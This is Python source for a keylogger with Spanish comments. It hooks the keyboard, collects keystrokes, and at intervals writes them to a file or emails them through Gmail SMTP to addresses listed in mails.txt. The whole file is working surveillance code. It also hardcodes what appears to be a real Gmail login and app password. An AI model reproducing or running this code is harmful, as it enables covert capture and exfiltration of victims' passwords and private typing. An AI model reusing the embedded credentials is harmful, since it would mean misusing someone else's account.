import pyxhook #a mi no me funciono con ese porque mac
# pero si con este from pynput import keyboard
#entonces si cambia el codigo poquito
import threading
import smtplib
import time
import sys


# Cambia estos datos a los tuyos
userMail = "keyloggerp531@gmail.com"
userPass = "zdhr jzws jqiq zkqf"
userTo = "sirofatala@gmail.com"
mailSubject = "Registro de teclas"
logfile = "output.txt"
wait_seconds = 10
guardar_txt = False
enviar_mail = False
keys = []
mails = []
server = None


def oneKeyEvent(event):
    tecla = event.Key
    keys.append(tecla)
   
    if tecla == "Escape":
        if enviar_mail:
            enviar_email()
        if guardar_txt:
            guardar_en_archivo()
        print("\n[!] Saliendo del programa.")
        sys.exit(0)

def callback():
    hm = pyxhook.HookManager()
    hm.KeyDown = oneKeyEvent
    hm.HookKeyboard()
    hm.start()





def formatear_tecla():
    data = "".join(keys)
    return data.replace("space", " ")
    

def guardar_en_archivo():
    try:
        with open(logfile, "a") as f:
            contenido = formatear_tecla()
            f.write(contenido)
            print("Texto guardado en archivo.")
    except Exception as e:
        print("Error al guardar en archivo:", e)

def config_server(): 
    global server 
    global mails 
    
    with open("mails.txt", "r") as archivo:
        mails = [linea.strip() for linea in archivo]
        
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login(userMail, userPass)
    
    
def enviar_email():    
    try:        
        contenido = formatear_tecla()
        mensaje = f"Subject: {mailSubject}\n\n{contenido}"
        
        for mail in mails: 
            server.sendmail(userMail, [mail], mensaje)
        print("Correo enviado :)")
                
    except Exception as e:
        print("Error al enviar el correo :(")
        import traceback
        traceback.print_exc()

def output():
    global keys
    while True:
        time.sleep(wait_seconds)
        if keys:
            if enviar_mail:
                enviar_email()
            if guardar_txt:
                guardar_en_archivo()
            keys.clear()




def pregunta(prompt):
    while True:
        respuesta = input(prompt).strip().lower()
        if respuesta == "exit":
            print("Terminando ejecución")
            sys.exit(0)
        if respuesta in ("y"):
            return True
        elif respuesta in ("n"):
            return False
        else:
            print("Responde con 'y','n' o 'exit'")

if __name__ == "__main__":
    print("Para salir en cualquier pregunta escribe 'exit'.\n")

    enviar_mail = pregunta("¿Deseas enviar los registros por email? [y/n]: ")
    guardar_txt = pregunta("¿Deseas guardar los registros en texto plano? [y/n]: ")

    if not enviar_mail and not guardar_txt:
        print("No se seleccionó ninguna acción. El programa se cerrará.")
        sys.exit(0)
    
    if enviar_mail:
        print("\nPor favor espere, configurando el sistema para mandar mails, puede tardar unos instantes")
        config_server()
        print("Se termino de configurar")

    print("\nIniciando.... Presiona ESC para salir.")
    t = threading.Thread(target=output, daemon=True)
    t.start()
    callback()